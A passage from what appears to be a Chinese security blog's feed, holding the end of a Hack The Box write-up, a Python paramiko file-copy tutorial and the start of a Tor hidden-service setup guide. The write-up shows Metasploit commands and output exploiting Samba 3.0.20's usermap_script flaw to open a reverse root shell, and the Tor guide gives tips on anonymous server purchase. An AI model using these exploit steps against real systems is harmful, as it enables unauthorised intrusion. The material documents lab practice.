10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;bwUgUizy.so using &#x2F;tmp&#x2F;bwUgUizy.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\MrXnfKQi.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;MrXnfKQi.so using \\PIPE\&#x2F;tmp&#x2F;MrXnfKQi.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;MrXnfKQi.so using &#x2F;tmp&#x2F;MrXnfKQi.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\IrLNSJry.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;IrLNSJry.so using \\PIPE\&#x2F;tmp&#x2F;IrLNSJry.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;IrLNSJry.so using &#x2F;tmp&#x2F;IrLNSJry.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\OTPwgrKE.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;OTPwgrKE.so using \\PIPE\&#x2F;tmp&#x2F;OTPwgrKE.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;OTPwgrKE.so using &#x2F;tmp&#x2F;OTPwgrKE.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\JrkOYjod.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;JrkOYjod.so using \\PIPE\&#x2F;tmp&#x2F;JrkOYjod.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;JrkOYjod.so using &#x2F;tmp&#x2F;JrkOYjod.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\YvdemyjB.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;YvdemyjB.so using \\PIPE\&#x2F;tmp&#x2F;YvdemyjB.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;YvdemyjB.so using &#x2F;tmp&#x2F;YvdemyjB.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\TZwUwKCI.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;TZwUwKCI.so using \\PIPE\&#x2F;tmp&#x2F;TZwUwKCI.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;TZwUwKCI.so using &#x2F;tmp&#x2F;TZwUwKCI.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\QKRnyble.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;QKRnyble.so using \\PIPE\&#x2F;tmp&#x2F;QKRnyble.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;QKRnyble.so using &#x2F;tmp&#x2F;QKRnyble.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\BWmGFjTi.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;BWmGFjTi.so using \\PIPE\&#x2F;tmp&#x2F;BWmGFjTi.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;BWmGFjTi.so using &#x2F;tmp&#x2F;BWmGFjTi.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\GZyqTHMK.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;GZyqTHMK.so using \\PIPE\&#x2F;tmp&#x2F;GZyqTHMK.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;GZyqTHMK.so using &#x2F;tmp&#x2F;GZyqTHMK.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\fMAjcmep.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;fMAjcmep.so using \\PIPE\&#x2F;tmp&#x2F;fMAjcmep.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;fMAjcmep.so using &#x2F;tmp&#x2F;fMAjcmep.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure></li><li><p>结果是不行,估计这个靶机太旧了,攻击的module时间上太新,对应不上,继续测试下一个module.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;linux&#x2F;samba&#x2F;lsa_transnames_heap</span><br><span class="line">msf5 exploit(linux&#x2F;samba&#x2F;lsa_transnames_heap) &gt; show options </span><br><span class="line"> </span><br><span class="line">Module options (exploit&#x2F;linux&#x2F;samba&#x2F;lsa_transnames_heap):</span><br><span class="line"> </span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  LSARPC           yes       The pipe name to use</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Exploit target:</span><br><span class="line"> </span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Linux vsyscall</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">msf5 exploit(linux&#x2F;samba&#x2F;lsa_transnames_heap) &gt; set rhosts 10.10.10.3</span><br><span class="line">rhosts &#x3D;&gt; 10.10.10.3</span><br><span class="line">msf5 exploit(linux&#x2F;samba&#x2F;lsa_transnames_heap) &gt; check</span><br><span class="line">[*] 10.10.10.3:445 - The service is running, but could not be validated.</span><br><span class="line">msf5 exploit(linux&#x2F;samba&#x2F;lsa_transnames_heap) &gt; exploit </span><br><span class="line"> </span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.20:4444 </span><br><span class="line">[*] 10.10.10.3:445 - Creating nop sled....</span><br><span class="line">[*] 10.10.10.3:445 - Trying to exploit Samba with address 0xffffe410...</span><br><span class="line">[*] 10.10.10.3:445 - Connecting to the SMB service...</span><br><span class="line">[-] 10.10.10.3:445 - Exploit aborted due to failure: no-target: This target is not a vulnerable Samba server (Samba 3.0.20-Debian)</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure></li><li><p>还是不行,但是检查出来了samba服务的版本,Samba server (Samba 3.0.20-Debian),再次查找一下modules</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf5 &gt; search samba 3.0.20</span><br><span class="line"> </span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> </span><br><span class="line">   #   Name                                                   Disclosure Date  Rank       Check  Description</span><br><span class="line">   -   ----                                                   ---------------  ----       -----  -----------</span><br><span class="line">   0   auxiliary&#x2F;admin&#x2F;http&#x2F;wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation</span><br><span class="line">   1   auxiliary&#x2F;admin&#x2F;smb&#x2F;samba_symlink_traversal                             normal     No     Samba Symlink Directory Traversal</span><br><span class="line">   2   auxiliary&#x2F;dos&#x2F;samba&#x2F;lsa_addprivs_heap                                   normal     No     Samba lsa_io_privilege_set Heap Overflow</span><br><span class="line">   3   auxiliary&#x2F;dos&#x2F;samba&#x2F;lsa_transnames_heap                                 normal     No     Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   4   auxiliary&#x2F;dos&#x2F;samba&#x2F;read_nttrans_ea_list                                normal     No     Samba read_nttrans_ea_list Integer Overflow</span><br><span class="line">   5   auxiliary&#x2F;scanner&#x2F;rsync&#x2F;modules_list                                    normal     Yes    List Rsync Modules</span><br><span class="line">   6   auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_uninit_cred                                   normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State</span><br><span class="line">   7   exploit&#x2F;freebsd&#x2F;samba&#x2F;trans2open                       2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)</span><br><span class="line">   8   exploit&#x2F;linux&#x2F;samba&#x2F;chain_reply                        2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)</span><br><span class="line">   9   exploit&#x2F;linux&#x2F;samba&#x2F;is_known_pipename                  2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load</span><br><span class="line">   10  exploit&#x2F;linux&#x2F;samba&#x2F;lsa_transnames_heap                2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   11  exploit&#x2F;linux&#x2F;samba&#x2F;setinfopolicy_heap                 2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow</span><br><span class="line">   12  exploit&#x2F;linux&#x2F;samba&#x2F;trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Linux x86)</span><br><span class="line">   13  exploit&#x2F;multi&#x2F;samba&#x2F;nttrans                            2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow</span><br><span class="line">   14  exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script                     2007-05-14       excellent  No     Samba &quot;username map script&quot; Command Execution</span><br><span class="line">   15  exploit&#x2F;osx&#x2F;samba&#x2F;lsa_transnames_heap                  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   16  exploit&#x2F;osx&#x2F;samba&#x2F;trans2open                           2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)</span><br><span class="line">   17  exploit&#x2F;solaris&#x2F;samba&#x2F;lsa_transnames_heap              2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   18  exploit&#x2F;solaris&#x2F;samba&#x2F;trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)</span><br><span class="line">   19  exploit&#x2F;unix&#x2F;http&#x2F;quest_kace_systems_management_rce    2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection</span><br><span class="line">   20  exploit&#x2F;unix&#x2F;misc&#x2F;distcc_exec                          2002-02-01       excellent  Yes    DistCC Daemon Command Execution</span><br><span class="line">   21  exploit&#x2F;unix&#x2F;webapp&#x2F;citrix_access_gateway_exec         2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution</span><br><span class="line">   22  exploit&#x2F;windows&#x2F;fileformat&#x2F;ms14_060_sandworm           2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution</span><br><span class="line">   23  exploit&#x2F;windows&#x2F;http&#x2F;sambar6_search_results            2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow</span><br><span class="line">   24  exploit&#x2F;windows&#x2F;license&#x2F;calicclnt_getconfig            2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow</span><br><span class="line">   25  exploit&#x2F;windows&#x2F;smb&#x2F;group_policy_startup               2015-01-26       manual     No     Group Policy Script Execution From Shared Resource</span><br><span class="line">   26  post&#x2F;linux&#x2F;gather&#x2F;enum_configs</span><br></pre></td></tr></table></figure></li><li><p>我们发现14行,就是我们在searchsploit中查找的对应3.0.20版本的利用模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit)          | exploits&#x2F;unix&#x2F;remote&#x2F;16320.rb</span><br></pre></td></tr></table></figure></li><li><p>那我们就继续测试一下这个模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script</span><br><span class="line">msf5 exploit(multi&#x2F;samba&#x2F;usermap_script) &gt; show options </span><br><span class="line"> </span><br><span class="line">Module options (exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script):</span><br><span class="line"> </span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT   139              yes       The target port (TCP)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Payload options (cmd&#x2F;unix&#x2F;reverse):</span><br><span class="line"> </span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.14.20      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Exploit target:</span><br><span class="line"> </span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">msf5 exploit(multi&#x2F;samba&#x2F;usermap_script) &gt; exploit </span><br><span class="line"> </span><br><span class="line">[*] Started reverse TCP double handler on 10.10.14.20:4444 </span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: echo eS2w9PPzBQqxnYsx;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket B</span><br><span class="line">[*] B: &quot;eS2w9PPzBQqxnYsx\r\n&quot;</span><br><span class="line">[*] Matching...</span><br><span class="line">[*] A is input...</span><br><span class="line">[*] Command shell session 3 opened (10.10.14.20:4444 -&gt; 10.10.10.3:42007) at 2020-01-31 22:38:09 -0500</span><br><span class="line"> </span><br><span class="line">pwd</span><br><span class="line">&#x2F;</span><br><span class="line">who</span><br><span class="line">root     pts&#x2F;0        Jan 28 17:05 (:0.0)</span><br><span class="line">cd &#x2F;root</span><br><span class="line">ls</span><br><span class="line">Desktop</span><br><span class="line">reset_logs.sh</span><br><span class="line">root.txt</span><br><span class="line">vnc.log</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure></li><li><p>可以看到直接就利用成功，并且取得了shell,查看root.txt取得flag</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python复制远程文件及文件目录到本地</title>
      <link href="/2019/01/15/Python/Python%E5%A4%8D%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%88%B0%E6%9C%AC%E5%9C%B0/"/>
      <url>/2019/01/15/Python/Python%E5%A4%8D%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%88%B0%E6%9C%AC%E5%9C%B0/</url>
      
        <content type="html"><![CDATA[<ul><li><p>paramiko是用python写的一个模块，遵循SSH2协议，支持以加密和认证的方式，进行远程服务器的连接。利用该模块，可以方便的进行ssh连接和sftp协议进行sftp文件传输以及远程命令执行,常用于python运维开发；</p><ul><li><p><strong>paramiko 模块内部依赖pycrypto，所以先导入pycrypto</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pycrypto</span><br><span class="line">pip3 install paramiko</span><br></pre></td></tr></table></figure></li></ul></li><li><p>定义一个方法，用于远程复制文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoteScp</span><span class="params">(host_ip, host_port, host_username, host_password, remote_file, local_file)</span>:</span></span><br><span class="line">    scp = paramiko.Transport((host_ip, host_port))</span><br><span class="line">    scp.connect(username=host_username, password=host_password)</span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(scp)</span><br><span class="line">    sftp.get(remote_file, local_file)</span><br><span class="line">    scp.close()</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">"success"</span>)</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">**注意这里的语句**</span><br><span class="line">`sftp.get(remote_file, local_file)` 中自带的get方法，只能拷贝文件，不能拷贝文件夹。</span><br><span class="line"></span><br><span class="line">* 然后调用这个方法：</span><br><span class="line">```python</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    host_ip = <span class="string">'192.168.1.123'</span></span><br><span class="line">    host_port = <span class="number">22</span></span><br><span class="line">    host_username = <span class="string">'root'</span></span><br><span class="line">    host_password = <span class="string">'password'</span></span><br><span class="line">    remote_path = <span class="string">'/tmp/test.sql'</span></span><br><span class="line">    local_path = <span class="string">'/tmp/test.sql'</span></span><br><span class="line">    RemoteScp(host_ip, host_port, host_username, host_password, remote_path, local_path)</span><br></pre></td></tr></table></figure></li></ul><p>这就是基本远程文件复制的功能实现。这里只能实现文件对文件的远程复制。</p><p>如果我们要远程复制整个文件夹。需要对上面的方法改进一下，加一段循环，让其能遍历远程目录里的所有文件，然后按照上面的方法依次复制到本地。</p><blockquote><p><strong>修改以后的完整代码如下</strong>:</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoteScp</span><span class="params">(host_ip, host_port, host_username, host_password, remote_path, local_path)</span>:</span></span><br><span class="line">    scp = paramiko.Transport((host_ip, host_port))</span><br><span class="line">    scp.connect(username=host_username, password=host_password)</span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(scp)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        remote_files = sftp.listdir(remote_path)</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> remote_files:   <span class="comment">#遍历读取远程目录里的所有文件</span></span><br><span class="line">            local_file = local_path + file</span><br><span class="line">            remote_file = remote_path + file</span><br><span class="line">            sftp.get(remote_file, local_file)</span><br><span class="line">    <span class="keyword">except</span> IOError:   <span class="comment">#  如果目录不存在则抛出异常</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"remote_path or local_path is not exist"</span>)</span><br><span class="line">    scp.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    host_ip = <span class="string">'192.168.1.123'</span>        <span class="comment"># 远程服务器IP</span></span><br><span class="line">    host_port = <span class="number">22</span>                   <span class="comment"># 远程服务器端口</span></span><br><span class="line">    host_username = <span class="string">'root'</span>           <span class="comment">#远程服务器用户名</span></span><br><span class="line">    host_password = <span class="string">'password'</span>       <span class="comment">#远程服务器密码</span></span><br><span class="line">    remote_path = <span class="string">'/tmp/'</span>            <span class="comment">#这个是远程目录</span></span><br><span class="line">    local_path = <span class="string">'/tmp/'</span>             <span class="comment">#这个是本地目录</span></span><br><span class="line">    RemoteScp(host_ip, host_port, host_username, host_password, remote_path, local_path)  <span class="comment">#调用方法</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> Python运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> paramiko </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暗网网站搭建和onion域名获取方法</title>
      <link href="/2018/06/12/Darknet/%E6%9A%97%E7%BD%91%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E5%92%8Conion%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7%E6%96%B9%E6%B3%95/"/>
      <url>/2018/06/12/Darknet/%E6%9A%97%E7%BD%91%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E5%92%8Conion%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="tor项目"><a href="#tor项目" class="headerlink" title="tor项目"></a><strong>tor项目</strong></h3><p>tor项目是美国海军的秘密项目，之后被开源用于真正的匿名网络中。在tor的网络中，你的真实的ip地址和其他和你有关的任何暴露于互联网的信息都会被隐藏，真正保护了用户。tor项目不但为一般用户提供客户端，同时也提供了.onion域名和服务，利用.onion域名可以把你网站的真正地址隐藏起来。</p></blockquote><h4 id="暗网网站搭建准备材料"><a href="#暗网网站搭建准备材料" class="headerlink" title="暗网网站搭建准备材料"></a><strong>暗网网站搭建准备材料</strong></h4><ul><li>服务器或本机内网映射</li><li>网站搭建相关技术</li></ul><p><strong>服务器选择</strong></p><p>如何你想真正隐藏自己，你需要做以下步骤</p><ul><li>建议使用Debian或者Ubuntu的服务器，tor官方文档支持较好</li><li>服务器只用来做tor网站不做其他的任何东西</li><li>匿名支付购买服务器</li><li>不要在服务器上运行 Tor 中继，因为 Tor 中继的ip是暴露的</li><li>不要接受和发送电子邮件</li></ul><p><strong>网站配置</strong></p><ul><li><p>安装nginx或者apache，这里以nginx为例（nginx的使用最为广泛）</p></li><li><p>编辑nginx配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">listen   127.0.0.1:xxxx;#xxxx是你的端口号 不要设置成80为了安全</span><br><span class="line"></span><br><span class="line">…</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sudo service nginx restart#重启服务</span><br></pre></td></tr></table></figure></li><li><p>以Debian服务器搭建暗网网站为例</p></li></ul><h4 id="Tor服务安装"><a href="#Tor服务安装" class="headerlink" title="Tor服务安装"></a><strong>Tor服务安装</strong></h4><ul><li>一般可以通过apt直接安装tor服务 <code>apt install tor</code></li></ul><p>如果不行请进行以下操作</p><ol><li><p>修改source.list</p><figure class="highlight plain"><table><tr><td 